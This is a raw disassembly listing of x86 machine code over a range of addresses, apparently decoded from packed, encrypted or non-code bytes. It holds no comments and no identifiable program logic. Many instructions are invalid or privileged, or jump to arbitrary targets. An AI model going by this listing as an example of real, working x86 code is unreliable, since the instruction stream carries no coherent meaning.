  413f0d:	cmp    ah,cl
  413f0f:	jp     0x413ece
  413f11:	push   ss
  413f12:	pop    edi
  413f13:	jecxz  0x413e9b
  413f15:	dec    eax
  413f16:	lods   eax,DWORD PTR ds:[esi]
  413f17:	cld    
  413f18:	clc    
  413f19:	inc    esp
  413f1a:	ror    DWORD PTR [eax-0x182d44a5],cl
  413f20:	jg     0x413ea7
  413f22:	pop    eax
  413f23:	jb     0x413f60
  413f25:	cwde   
  413f26:	mov    DWORD PTR [ebp+0x6e719b94],esi
  413f2c:	xchg   ebx,eax
  413f2d:	or     al,0x5
  413f2f:	lds    eax,FWORD PTR [ebp-0x12]
  413f32:	mov    ebp,0xc558cf09
  413f37:	jae    0x413fae
  413f39:	cmp    DWORD PTR [eax-0x4a],ebp
  413f3c:	sahf   
  413f3d:	sub    al,0xb5
  413f3f:	xchg   ecx,eax
  413f40:	sbb    BYTE PTR [ecx+edx*2],bh
  413f43:	loopne 0x413f7c
  413f45:	jmp    0xaeca0047
  413f4a:	lds    ecx,FWORD PTR [eax]
  413f4c:	mov    al,ds:0x6b0385d7
  413f51:	lock sahf 
  413f53:	pop    ss
  413f54:	je     0x413f47
  413f56:	xor    eax,0x64213ae6
  413f5b:	xchg   esi,eax
  413f5c:	(bad)  
  413f5d:	(bad)  [edi+0x41]
  413f60:	bound  esi,QWORD PTR [esp+esi*1]
  413f63:	clc    
  413f64:	repz jle 0x413fd7
  413f67:	xor    edi,0xc39956cb
  413f6d:	mov    bh,0xca
  413f6f:	add    al,0xcd
  413f71:	mov    ds:0x63941cd1,eax
  413f76:	out    dx,al
  413f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f78:	add    BYTE PTR [ecx],dh
  413f7a:	push   edi
  413f7b:	mov    DWORD PTR [ebp+0x198ccb87],eax
  413f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f82:	push   0xf3969ee8
  413f87:	test   ebp,edi
  413f89:	add    bl,BYTE PTR [ebx+0x1ce1995a]
  413f8f:	dec    esp
  413f90:	stos   BYTE PTR es:[edi],al
  413f91:	push   cs
  413f92:	mov    ecx,0x7c0e98a5
  413f97:	jo     0x413fc0
  413f99:	ja     0x413fb0
  413f9b:	add    ebx,ebp
  413f9d:	mov    bh,0x68
  413f9f:	mov    ebx,0x8d0e6acb
  413fa4:	sub    edi,DWORD PTR [ecx+0x29]
  413fa7:	cmp    BYTE PTR [ecx+0x51a306ec],dl
  413fad:	js     0x413f69
  413faf:	ins    DWORD PTR es:[edi],dx
  413fb0:	retf   
  413fb1:	ficom  WORD PTR [edi]
  413fb3:	push   ds
  413fb4:	es dec edx
  413fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb7:	and    eax,0x7c23739c
  413fbc:	outs   dx,BYTE PTR ds:[esi]
  413fbd:	gs inc esp
  413fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fc0:	cld    
  413fc1:	lods   al,BYTE PTR ds:[esi]
  413fc2:	inc    esp
  413fc3:	mov    eax,0x7a0f141c
  413fc8:	push   0x1402aa60
  413fcd:	xchg   BYTE PTR ds:0xbcdcaade,dh
  413fd3:	mov    DWORD PTR [edi+0x32f5f6c3],esi
  413fd9:	lods   al,BYTE PTR ds:[esi]
  413fda:	jle    0x413fd9
  413fdc:	cmp    BYTE PTR [edi-0x6b],ah
  413fdf:	pop    ebx
  413fe0:	jle    0x413f67
  413fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe3:	and    BYTE PTR [ebx+0x40],dh
  413fe6:	jecxz  0x414052
  413fe8:	das    
  413fe9:	jp     0x413fa9
  413feb:	mov    gs,WORD PTR [ecx]
  413fed:	or     al,0xff
  413fef:	cld    
  413ff0:	aas    
  413ff1:	inc    ecx
  413ff2:	test   ebp,edx
  413ff4:	fwait
  413ff5:	cli    
  413ff6:	sti    
  413ff7:	mov    al,ds:0x5a4d3b73
  413ffc:	(bad)  
  413ffe:	inc    ebx
  413fff:	sbb    ebp,ebp
  414001:	xor    al,BYTE PTR [esi]
  414003:	push   edx
  414004:	mov    dh,0x35
  414006:	push   edi
  414007:	lock aad 0x2c
  41400a:	pop    edi
  41400b:	repz shl DWORD PTR [ebx],1
  41400e:	jnp    0x414021
  414010:	icebp  
  414011:	sub    BYTE PTR [eax],bh
  414013:	pop    ebp
  414014:	add    BYTE PTR [eax-0x262539e6],al
  41401a:	mov    ebx,ebx
  41401c:	jmp    DWORD PTR [eax+0x25]
  41401f:	les    eax,FWORD PTR [edi-0x27041ee0]
  414025:	mov    al,ds:0xe64d3276
  41402a:	jmp    0xa7099ae3
  41402f:	mov    al,ds:0xbebd4ff6
  414034:	push   esi
  414035:	mov    ch,0xbc
  414037:	arpl   WORD PTR [edi],dx
  414039:	mov    ch,0x5c
  41403b:	ins    BYTE PTR es:[edi],dx
  41403c:	and    esi,ecx
  41403e:	stos   BYTE PTR es:[edi],al
  41403f:	pop    ecx
  414040:	and    eax,0xd60f2c07
  414045:	push   cs
  414046:	std    
  414047:	outs   dx,BYTE PTR ds:[esi]
  414048:	fiadd  WORD PTR [ecx]
  41404a:	or     al,0xf2
  41404c:	and    BYTE PTR [edx+ebp*2],0xd4
  414050:	mov    edi,0x3d56b57b
  414055:	aaa    
  414056:	faddp  st(6),st
  414058:	lahf   
  414059:	push   0xcb96df1e
  41405e:	popf   
  41405f:	nop
  414060:	fs xor esi,ebx
  414063:	pushf  
  414064:	sub    BYTE PTR [edx],bh
  414066:	arpl   bp,bp
  414068:	sbb    bh,al
  41406a:	nop
  41406b:	or     DWORD PTR [ebp-0x6c],eax
  41406e:	push   ss
  41406f:	cmp    eax,DWORD PTR [esi-0x24]
  414072:	loop   0x4140ce
  414074:	ror    edi,1
  414076:	inc    esp
  414077:	test   eax,0xe196c4c8
  41407c:	enter  0xeabc,0xab
  414080:	jmp    0xdf0a:0x4084cb55
  414087:	mov    eax,0x78871882
  41408c:	leave  
  41408d:	aaa    
  41408e:	bound  esi,QWORD PTR [esi+0x13]
  414091:	dec    ebx
  414092:	xor    BYTE PTR [ebp-0x7c],ah
  414095:	and    DWORD PTR [ebp+edi*2+0x5a],edx
  414099:	pop    edx
  41409a:	mov    WORD PTR es:[ebp+0x4767e44a],gs
  4140a1:	retf   0x7fb7
  4140a4:	and    eax,0x6d83921b
  4140a9:	pop    ss
  4140aa:	push   ss
  4140ab:	cli    
  4140ac:	add    BYTE PTR [ecx],al
  4140ae:	jle    0x414102
  4140b0:	mov    ds:0xddfd4e14,eax
  4140b5:	in     eax,dx
  4140b6:	mov    dl,0xc6
  4140b8:	xor    eax,0xc2c4672
  4140bd:	xchg   ebx,eax
  4140be:	sub    DWORD PTR [edi+0x4b12d25a],esi
  4140c4:	scas   eax,DWORD PTR es:[edi]
  4140c5:	mov    bh,0x73
  4140c7:	push   ebp
  4140c8:	adc    eax,0x52e7cffb
  4140cd:	and    BYTE PTR [ebx-0x6e],0x13
  4140d1:	out    0x36,eax
  4140d3:	xchg   ebx,eax
  4140d4:	jno    0x4140d3
  4140d6:	mov    BYTE PTR ds:0x73a78802,bh
  4140dc:	add    edi,DWORD PTR [ebp+0x6a]
  4140df:	or     eax,0xe1c44e28
  4140e4:	and    DWORD PTR [ebx+0x33],ecx
  4140e7:	aas    
  4140e8:	sar    BYTE PTR ds:0xf61dccb7,1
  4140ee:	push   edx
  4140ef:	xchg   esi,eax
  4140f0:	call   0x56b4:0x92365980
  4140f7:	ds addr16 cld 
  4140fa:	xchg   BYTE PTR [eax+0x27a8abd4],al
  414100:	lods   eax,DWORD PTR ds:[esi]
  414101:	xor    eax,0xb566a857
  414106:	out    0x74,al
  414108:	and    DWORD PTR ds:0x360b6d7e,eax
  41410e:	xchg   ebx,eax
  41410f:	pop    ebp
  414110:	int3   
  414111:	xor    eax,0x2eeb4583
  414116:	mov    eax,0x5e96e618
  41411b:	xor    bh,BYTE PTR [esi+edx*8+0x79e66b3b]
  414122:	jmp    0x3f65:0x2f04f3cb
  414129:	ins    BYTE PTR es:[edi],dx
  41412a:	xor    al,0x39
  41412c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41412d:	sar    BYTE PTR [eax],1
  41412f:	and    eax,0xb71dc89c
  414134:	idiv   BYTE PTR [edi-0x3fc291c8]
  41413a:	iret   
  41413b:	xlat   BYTE PTR ds:[ebx]
  41413c:	dec    esp
  41413d:	cmp    al,0xc4
  41413f:	add    BYTE PTR [ebx-0x5e0f6bf5],ch
  414145:	xor    DWORD PTR [esi],esp
  414147:	inc    ebp
  414148:	test   DWORD PTR [esi-0x28],ecx
  41414b:	lock push cs
  41414d:	pop    ss
  41414e:	icebp  
  41414f:	sub    eax,0xe0a786c6
  414154:	mov    ebp,0xd045f27e
  414159:	ds test esi,edi
  41415c:	pusha  
  41415d:	pusha  
  41415e:	or     BYTE PTR ds:[ecx-0x50],0xfb
  414163:	ds dec esp
  414165:	push   edi
  414166:	aad    0xc
  414168:	mov    bl,0xa3
  41416a:	dec    eax
  41416b:	ja     0x414187
  41416d:	mov    al,ds:0x8187239f
  414172:	inc    BYTE PTR [ecx+ecx*1]
  414175:	pushf  
  414176:	bound  edx,QWORD PTR [edx-0x3f6de0]
  41417c:	mov    eax,ds:0x4cfa663c
  414181:	mov    ebp,0x918bbce7
  414186:	or     esi,DWORD PTR [edx+esi*2-0x7e723844]
  41418d:	jmp    0x2ee0ebc5
  414192:	mov    WORD PTR [ebx+ecx*8+0x3b510611],cs
  414199:	into   
  41419a:	scas   eax,DWORD PTR es:[edi]
  41419b:	pop    ss
  41419c:	pop    esp
  41419d:	lds    edx,FWORD PTR [eax+edi*8+0x7a7fac4e]
  4141a4:	adc    eax,0xc3407d7e
  4141a9:	xor    eax,0x351e6c6f
  4141ae:	or     ah,cl
  4141b0:	sub    al,0xa0
  4141b2:	inc    ebp
  4141b3:	sub    eax,0x2064e06b
  4141b8:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141bb:	jg     0x41423a
  4141bd:	retf   0xac98
  4141c0:	test   ebp,ebx
  4141c2:	adc    eax,0x5a8358db
  4141c7:	pop    esi
  4141c8:	mov    dh,0x64
  4141ca:	icebp  
  4141cb:	inc    ebx
  4141cc:	xchg   edx,eax
  4141cd:	push   eax
  4141ce:	test   eax,0x79daa694
  4141d3:	push   0xffffffa5
  4141d5:	es and eax,0x158f8f23
  4141db:	push   0x5452deaf
  4141e0:	add    ch,BYTE PTR [edi+0x49]
  4141e3:	bound  esi,QWORD PTR [eax+0x2c]
  4141e6:	add    ch,BYTE PTR [ebx]
  4141e8:	popa   
  4141e9:	pop    esp
  4141ea:	xor    eax,0x96361d60
  4141ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141f0:	inc    esi
  4141f1:	jb     0x41425c
  4141f3:	leave  
  4141f4:	ins    BYTE PTR es:[edi],dx
  4141f5:	mov    al,ds:0xb00a75f5
  4141fa:	push   ebx
  4141fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141fc:	lea    ecx,[ecx+0x2d]
  4141ff:	fs mov ch,0xa3
  414202:	ror    DWORD PTR [esp+ebx*2-0x358c5afe],cl
  414209:	or     DWORD PTR [edi],ebx
  41420b:	inc    ebp
  41420c:	cs jmp 0x414222
  41420f:	aas    
  414210:	mov    bl,0x9f
  414212:	mov    bl,0xed
  414214:	ret    
  414215:	and    bh,dh
  414217:	push   ss
  414218:	and    BYTE PTR [esi+eiz*4],dl
  41421b:	daa    
  41421c:	push   eax
  41421d:	test   DWORD PTR [edx+0x4e],0xd28508c1
  414224:	bound  ebp,QWORD PTR [ecx+0x6f]
  414227:	lods   al,BYTE PTR ds:[esi]
  414228:	push   ds
  414229:	add    eax,0x4913b1b3
  41422e:	leave  
  41422f:	sub    dl,al
  414231:	pop    edi
  414232:	adc    edx,eax
  414234:	sub    BYTE PTR [edi+0x4e297371],cl
  41423a:	jo     0x414252
  41423c:	arpl   WORD PTR [esi+ecx*1],bp
  41423f:	dec    edx
  414240:	loope  0x41428e
  414242:	pusha  
  414243:	js     0x41429e
  414245:	mov    edi,0xcbca2a9b
  41424a:	shl    DWORD PTR [eax-0x27c44fcd],cl
  414250:	shr    bl,cl
  414252:	and    ebp,0x44
  414255:	xchg   esi,eax
  414256:	push   edi
  414257:	int3   
  414258:	pushf  
  414259:	repnz add cl,BYTE PTR [esi]
  41425c:	daa    
  41425d:	das    
  41425e:	icebp  
  41425f:	add    BYTE PTR [eax],bl
  414261:	push   esp
  414262:	(bad)  
  414263:	xor    al,0xc0
  414265:	xor    al,0xcc
  414267:	aas    
  414268:	pop    edi
  414269:	adc    eax,0xcbd19506
  41426e:	out    dx,eax
  41426f:	mov    ebp,0xab227f
  414274:	dec    ebp
  414275:	lea    ebp,[edx]
  414277:	shl    DWORD PTR [eax],0xe3
  41427a:	inc    esp
  41427b:	fldcw  WORD PTR [ebp-0x37070531]
  414281:	ins    BYTE PTR es:[edi],dx
  414282:	aam    0x45
  414284:	rol    DWORD PTR [ecx],cl
  414286:	fwait
  414287:	jp     0x41420e
  414289:	jl     0x41427f
  41428b:	in     eax,dx
  41428c:	xchg   ebp,eax
  41428d:	sbb    DWORD PTR [ecx-0x438016e8],0x4272af76
  414297:	out    0x85,eax
  414299:	enterw 0xbe6d,0xb9
  41429e:	jg     0x414318
  4142a0:	pop    ds
  4142a1:	pop    esi
  4142a2:	(bad)  
  4142a4:	cmp    dl,BYTE PTR [edx+0x566098e3]
  4142aa:	jmp    0xee68:0xd90adfda
  4142b1:	pop    eax
  4142b2:	or     eax,0x75674867
  4142b7:	test   eax,0x8669ea6f
  4142bc:	inc    esi
  4142bd:	inc    edx
  4142be:	mov    WORD PTR [ecx+0x3404de66],ss
  4142c4:	inc    ebp
  4142c5:	arpl   si,ax
  4142c7:	inc    edi
  4142c8:	inc    ebp
  4142c9:	outs   dx,DWORD PTR ds:[esi]
  4142ca:	jnp    0x414338
  4142cc:	jae    0x4142cf
  4142ce:	inc    ecx
  4142cf:	mov    ebx,0xe4970edd
  4142d4:	(bad)  ds:0x4be132b1
  4142da:	jnp    0x4142d6
  4142dc:	push   eax
  4142dd:	ror    dh,1
  4142df:	cli    
  4142e0:	cmp    eax,0xaba1864c
  4142e5:	fwait
  4142e6:	push   ebx
  4142e7:	mov    ds:0xf3518c8,al
  4142ec:	out    0x81,eax
  4142ee:	in     eax,0x12
  4142f0:	aad    0xf0
  4142f2:	inc    bl
  4142f4:	retf   0x2969
  4142f7:	mov    ds,WORD PTR [edi+0x53121786]
  4142fd:	stc    
  4142fe:	cmc    
  4142ff:	ins    DWORD PTR es:[edi],dx
  414300:	clc    
  414301:	mov    ah,cl
  414303:	test   al,0xc8
  414305:	mov    dh,0x92
  414307:	icebp  
  414308:	jle    0x4142b9
  41430a:	fdiv   QWORD PTR [edx]
  41430c:	jnp    0x4142b8
  41430e:	mov    ebx,DWORD PTR [edx+0x6cf34924]
  414314:	push   es
  414315:	out    0xde,eax
  414317:	call   0x8af7ffb8
  41431c:	and    eax,0xb97d3c6f
  414321:	mov    ds:0x553271ea,al
  414326:	mov    al,dh
  414328:	mov    ecx,0x5003160a
  41432d:	mov    esi,0x9e23ba0d
  414332:	jb     0x41436a
  414334:	sahf   
  414335:	push   es
  414336:	hlt    
  414337:	es xor al,cl
  41433a:	lds    ebp,FWORD PTR [eax-0x66]
  41433d:	pushf  
  41433e:	adc    ecx,edx
  414340:	es in  al,0x9d
  414343:	(bad)  
  414344:	pop    ss
  414345:	pop    ecx
  414346:	mov    ?,WORD PTR [ebp-0x232b79f1]
  41434c:	xchg   ebp,eax
  41434d:	imul   ecx,DWORD PTR ds:0x1be7d7dc,0x24
  414354:	pop    edi
  414355:	or     dh,dl
  414357:	dec    eax
  414358:	xor    eax,0x6d4594ee
  41435d:	test   eax,0x11a071a4
  414362:	ins    BYTE PTR es:[edi],dx
  414363:	or     DWORD PTR [ecx+0x9d7a062],eax
  414369:	xor    ch,BYTE PTR [ebp+0x55]
  41436c:	gs aas 
  41436e:	pop    edi
  41436f:	pop    ds
  414370:	xchg   DWORD PTR [esi+0x6c],ebx
  414373:	addr16 inc ecx
  414375:	dec    eax
  414376:	test   al,0xee
  414378:	or     ch,0xf4
  41437b:	rol    dl,cl
  41437d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41437e:	push   esi
  41437f:	or     dh,BYTE PTR [edx]
  414381:	xor    al,0xb4
  414383:	inc    eax
  414384:	addr16 mov bl,0x95
  414387:	mov    bh,0xd8
  414389:	mov    ebp,0x9ad6fc40
  41438e:	add    DWORD PTR [edx-0x3b],esi
  414391:	inc    ebx
  414392:	mov    ebp,0x2dd78349
  414397:	sub    edx,esi
  414399:	js     0x41432f
  41439b:	das    
  41439c:	enter  0x2d9f,0xc4
  4143a0:	sub    BYTE PTR [ecx-0x40608047],cl
  4143a6:	and    ebx,DWORD PTR [eax+0x37]
  4143a9:	sahf   
  4143aa:	pushf  
  4143ab:	pushf  
  4143ac:	pushf  
  4143ad:	or     al,0xb2
  4143af:	mov    ebp,0xa09ed68f
  4143b4:	sahf   
  4143b5:	add    eax,0x649733cd
  4143ba:	psubsb mm2,QWORD PTR ss:[eax+0x43eefb2d]
  4143c2:	sub    cl,BYTE PTR ds:0xad333bfa
  4143c8:	or     esi,edx
  4143ca:	icebp  
  4143cb:	sub    cl,BYTE PTR [ecx+eax*1-0x2333a223]
  4143d2:	jne    0x41437f
  4143d4:	retf   0xe345
  4143d7:	add    BYTE PTR [esp+esi*2-0x1c],0x5d
  4143dc:	mov    ah,0x74
  4143de:	imul   edx,ebx,0x33
  4143e1:	adc    eax,0x2db5dbfa
  4143e6:	adc    esp,DWORD PTR [esi+0x274e81c]
  4143ec:	sbb    ah,BYTE PTR [esi-0x46]
  4143ef:	fstp   TBYTE PTR [ecx-0xf]
  4143f2:	out    0x11,al
  4143f4:	(bad)  
  4143f6:	cmp    dl,dh
  4143f8:	retf   
  4143f9:	inc    esi
  4143fa:	adc    BYTE PTR [ecx+0x5fcaea75],dl
  414400:	jne    0x414463
  414402:	xchg   ecx,eax
  414403:	adc    BYTE PTR [ebx],cl
  414405:	mov    al,ds:0x99512277
  41440a:	fstp   DWORD PTR [ecx-0x748ca66f]
  414411:	push   ecx
  414412:	cld    
  414413:	jp     0x414462
  414415:	push   ds
  414416:	in     eax,0x2b
  414418:	fsubr  st(4),st
  41441a:	xor    eax,0xf0a45389
  41441f:	mov    esp,0xf907801d
  414424:	cmovl  esp,DWORD PTR [edi+0x4f78d730]
  41442b:	outs   dx,BYTE PTR ds:[esi]
  41442c:	sub    al,0x1
  41442e:	nop
  41442f:	push   edx
  414430:	loop   0x4143f6
  414432:	ss cwde 
  414434:	jmp    0x6f71:0x29a2dc08
  41443b:	and    ch,BYTE PTR [edi-0x26]
  41443e:	xchg   edi,eax
  41443f:	or     DWORD PTR [edi+0xb],0x6420eef6
  414446:	lahf   
  414447:	cmp    ecx,DWORD PTR [edi+0x263c3264]
  41444d:	test   DWORD PTR es:[ecx-0x1f611c8],ecx
  414454:	stos   BYTE PTR es:[edi],al
  414455:	mov    bh,0x9c
  414457:	and    dh,BYTE PTR [ebx*4+0x7de9ff5b]
  41445e:	scas   al,BYTE PTR es:[edi]
  41445f:	ret    
  414460:	xchg   ecx,eax
  414461:	adc    BYTE PTR [edi],cl
  414463:	hlt    
  414464:	mov    ebx,0x5c8c2dd9
  414469:	adc    eax,0x2c1a83b5
  41446e:	xor    edx,DWORD PTR [eax-0x46]
  414471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414472:	std    
  414473:	cmp    eax,0x7c3f521e
  414478:	jbe    0x4144c8
  41447a:	jne    0x414427
  41447c:	sbb    al,0xe5
  41447e:	and    bl,BYTE PTR [esi+0x7f8fea7e]
  414484:	ror    DWORD PTR [eax+edi*1+0x6833f4cb],cl
  41448b:	dec    ebp
  41448c:	pop    esi
  41448d:	jge    0x41443d
  41448f:	push   es
  414490:	cmp    cl,BYTE PTR [edi-0x5ab2822]
  414496:	out    0xfd,eax
  414498:	bound  esi,QWORD PTR [ecx-0x4e]
  41449b:	mov    ch,0xca
  41449d:	out    dx,eax
  41449e:	add    ebx,DWORD PTR [esi]
  4144a0:	stos   BYTE PTR es:[edi],al
  4144a1:	fwait
  4144a2:	lds    ecx,FWORD PTR [ecx+ebx*8]
  4144a5:	ins    DWORD PTR es:[edi],dx
  4144a6:	stos   BYTE PTR es:[edi],al
  4144a7:	shr    ah,cl
  4144a9:	test   eax,0xe733344c
  4144ae:	lods   eax,DWORD PTR ds:[esi]
  4144af:	fldenv [edi+0x57]
  4144b2:	inc    ecx
  4144b3:	add    esp,ebx
  4144b5:	xor    ch,BYTE PTR [eax]
  4144b7:	sub    al,0xbb
  4144b9:	adc    DWORD PTR [ecx-0x10],edi
  4144bc:	nop
  4144bd:	xchg   ecx,eax
  4144be:	sub    DWORD PTR [ebp+0x21],eax
  4144c1:	or     BYTE PTR [esi],bh
  4144c3:	xchg   ebp,eax
  4144c4:	aam    0xa7
  4144c6:	cmp    eax,0x293bd747
  4144cb:	xchg   edx,eax
  4144cc:	mov    ds:0xaff65726,eax
  4144d1:	ret    0x11b8
  4144d4:	push   cs
  4144d5:	fdiv   QWORD PTR [ebp+0x27]
  4144d8:	xchg   ecx,eax
  4144d9:	cmp    BYTE PTR [esi+0x6f222f0f],dl
  4144df:	xor    al,0xd8
  4144e1:	adc    DWORD PTR [edi+0x4c],esp
  4144e4:	cld    
  4144e5:	loopne 0x41454b
  4144e7:	inc    ebp
  4144e8:	fcom   DWORD PTR [edx+esi*8-0x228eb2f8]
  4144ef:	fadd   QWORD PTR [esi+0x74295747]
  4144f5:	enter  0x8f6d,0x2d
  4144f9:	jae    0x414498
  4144fb:	loop   0x414569
  4144fd:	rcl    BYTE PTR [edx+0x34],cl
  414500:	outs   dx,BYTE PTR ds:[esi]
  414501:	inc    esi
  414502:	sbb    dl,bl
  414504:	iret   
  414505:	je     0x414554
  414507:	jae    0x4144a2
  414509:	es xchg edx,eax
  41450b:	mov    ds:0x6d5d8e84,al
  414510:	dec    edi
  414511:	shl    BYTE PTR [esi+edx*8],0x18
  414515:	pushf  
  414516:	out    dx,eax
  414517:	out    dx,eax
  414518:	(bad)  
  414519:	mov    esi,0xccf8ee41
  41451e:	push   ss
  41451f:	shl    BYTE PTR [eax-0x1f],1
  414522:	out    dx,al
  414523:	fist   DWORD PTR ds:[edx+0x59239720]
  41452a:	inc    ecx
  41452b:	jecxz  0x41453d
  41452d:	xlat   BYTE PTR ds:[ebx]
  41452e:	dec    ebp
  41452f:	test   al,0x59
  414531:	xlat   BYTE PTR ds:[ebx]
  414532:	push   edi
  414533:	dec    edx
  414534:	gs or  eax,esp
  414537:	sbb    al,0x85
  414539:	fld    QWORD PTR [esi+0x43192499]
  41453f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414540:	ret    0xce0
  414543:	push   ecx
  414544:	retf   0x6b0d
  414547:	push   ecx
  414548:	(bad)  
  41454a:	fnsave [ebx+0x7c]
  41454d:	xor    al,0xd1
  41454f:	mov    esp,0x87e32f53
  414554:	pop    esi
  414555:	and    al,0x2
  414557:	fwait
  414558:	push   edx
  414559:	rcl    DWORD PTR [eax],1
  41455b:	iret   
  41455c:	dec    edi
  41455d:	mov    edi,esp
  41455f:	jle    0x4145aa
  414561:	or     BYTE PTR [ecx-0x1090ae7d],bh
  414567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414568:	pop    es
  414569:	pop    ss
  41456a:	push   esi
  41456b:	mov    bl,0xa8
  41456d:	rcl    BYTE PTR [edx+edi*2],cl
  414570:	or     ecx,DWORD PTR [ecx*1+0x1d8d18a4]
  414577:	imul   esi,DWORD PTR [ebp-0x54],0xfffffffe
  41457b:	shl    DWORD PTR [edi],0xfd
  41457e:	push   ebx
  41457f:	loop   0x4145a7
  414581:	retf   0x10f8
  414584:	fprem1 
  414586:	mov    bh,0xa0
  414588:	das    
  414589:	inc    ebx
  41458a:	add    al,BYTE PTR [ecx+0x1]
  41458d:	ss out dx,al
  41458f:	repnz nop
  414591:	mov    dl,0xde
  414593:	mov    dl,0xee
  414595:	in     al,dx
  414596:	fist   WORD PTR [edx]
  414598:	and    al,0x24
  41459a:	mov    ecx,0xc6710014
  41459f:	or     al,0xb4
  4145a1:	add    eax,0xb2fa2068
  4145a6:	stc    
  4145a7:	xor    DWORD PTR [eax-0x54],0xe8c30619
  4145ae:	cmc    
  4145af:	into   
  4145b0:	and    edi,DWORD PTR [ebp-0x3631dc4a]
  4145b6:	xor    al,0x40
  4145b8:	aam    0x49
  4145ba:	adc    eax,0x560556f2
  4145bf:	test   eax,0x17fec949
  4145c4:	add    dh,dh
  4145c6:	std    
  4145c7:	sbb    ebx,ebp
  4145c9:	sub    ebp,0x22
  4145cc:	shld   DWORD PTR [edx-0x5],ecx,0x4f
  4145d1:	pushf  
  4145d2:	dec    edx
  4145d3:	pop    eax
  4145d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145d5:	dec    edi
  4145d6:	add    esi,edx
  4145d8:	inc    edi
  4145d9:	mov    edx,0x345522ad
  4145de:	popa   
  4145df:	div    BYTE PTR [eax-0x19]
  4145e2:	hlt    
  4145e3:	cmc    
  4145e4:	adc    bl,BYTE PTR [edx-0xdc35a6e]
  4145ea:	mov    al,0xc2
  4145ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145ed:	sahf   
  4145ee:	push   ebp
  4145ef:	and    DWORD PTR [ebx+0x71],edi
  4145f2:	out    0x38,eax
  4145f4:	das    
  4145f5:	jle    0x414645
  4145f7:	shl    bh,1
  4145f9:	mov    bl,0xd
  4145fb:	pop    edx
  4145fc:	cmp    ebx,DWORD PTR [edx-0x24]
  4145ff:	out    0xff,al
  414601:	sbb    BYTE PTR [ebp-0x6],ah
  414604:	xchg   esp,eax
  414605:	outs   dx,DWORD PTR ds:[esi]
  414606:	sbb    eax,DWORD PTR [eax-0x7c]
  414609:	cmp    ch,ah
  41460b:	lds    edi,FWORD PTR [edx+0x5aac0d53]
  414611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414612:	icebp  
  414613:	push   ss
  414614:	mov    ss,WORD PTR [ecx+0x10e4f691]
  41461a:	adc    ebx,DWORD PTR [ebx-0x2d]
  41461d:	mov    dl,0xe
  41461f:	scas   eax,DWORD PTR es:[edi]
  414620:	sbb    eax,0xe8429c0c
  414625:	scas   al,BYTE PTR es:[edi]
  414626:	loope  0x4145f9
  414628:	in     al,0xe4
  41462a:	test   BYTE PTR [ebx],dh
  41462c:	mov    al,ds:0x81d8c443
  414631:	jp     0x414652
  414633:	cdq    
  414634:	or     bh,bl
  414636:	dec    ebx
  414637:	dec    edx
  414638:	jle    0x414621
  41463a:	repnz sub BYTE PTR [eax+ebp*8-0x61],0x3a
  414640:	jb     0x4146b4
  414642:	enter  0x4207,0xb0
  414646:	fsubr  st,st(1)
  414648:	std    
  414649:	jle    0x4146c8
  41464b:	inc    ebp
  41464c:	adc    DWORD PTR [eax],esp
  41464e:	mov    ecx,0xfd0db124
  414653:	xor    ebp,DWORD PTR [esi-0x20]
  414656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414657:	mov    cl,0x8b
  414659:	or     dh,BYTE PTR [eax-0x6605dd3]
  41465f:	loopne 0x414618
  414661:	or     DWORD PTR [edx+0x61ff9f5a],0x3e59138c
  41466b:	push   ss
  41466c:	jno    0x414621
  41466e:	fmul   st,st(5)
  414670:	(bad)  
  414671:	cs icebp 
  414673:	mov    BYTE PTR [ecx-0x36574d82],ch
  414679:	js     0x4146f9
  41467b:	jle    0x414651
  41467d:	xchg   esi,eax
  41467e:	cwde   
  41467f:	in     eax,0xb4
  414681:	icebp  
  414682:	sar    DWORD PTR [ecx-0x16ba526],1
  414688:	add    BYTE PTR [esi+eiz*4-0x10],al
  41468c:	or     dl,BYTE PTR [edx-0x284598d6]
  414692:	cmp    cl,BYTE PTR [ebx-0x28]
  414695:	sub    eax,0x236020c9
  41469a:	int    0xac
  41469c:	rcl    edi,cl
  41469e:	inc    eax
  41469f:	inc    di
  4146a1:	mov    edx,0xfb2dc72f
  4146a6:	pushf  
  4146a7:	jb     0x4146a4
  4146a9:	cmp    al,BYTE PTR es:[esi-0x56644652]
  4146b0:	paddw  mm1,mm5
  4146b3:	push   esp
  4146b4:	jg     0x4146c4
  4146b6:	and    esp,DWORD PTR [ebx-0x2e]
  4146b9:	xor    ch,ah
  4146bb:	cdq    
  4146bc:	xlat   BYTE PTR ds:[ebx]
  4146bd:	xchg   ecx,eax
  4146be:	js     0x414692
  4146c0:	jle    0x4146fb
  4146c2:	push   esp
  4146c3:	pop    ss
  4146c4:	call   0xc6b2:0x72abe8ba
  4146cb:	sbb    al,0xd9
  4146cd:	inc    edi
  4146ce:	inc    eax
  4146cf:	repz pop ss
  4146d1:	pop    esp
  4146d2:	xor    BYTE PTR [ebp-0x670edd4c],dl
  4146d8:	sbb    DWORD PTR [esi+eiz*1],eax
  4146db:	add    al,0xe4
  4146dd:	push   edi
  4146de:	inc    ebp
  4146df:	mov    ebp,0xfcd16b69
  4146e4:	inc    edi
  4146e5:	ficomp WORD PTR [edx+edi*1-0x19]
  4146e9:	pop    es
  4146ea:	mov    ch,0x22
  4146ec:	pop    ebx
  4146ed:	cmp    dl,BYTE PTR [ebx-0x404ddfb6]
  4146f3:	clc    
  4146f4:	pop    edx
  4146f5:	jle    0x4146a0
  4146f7:	pop    edi
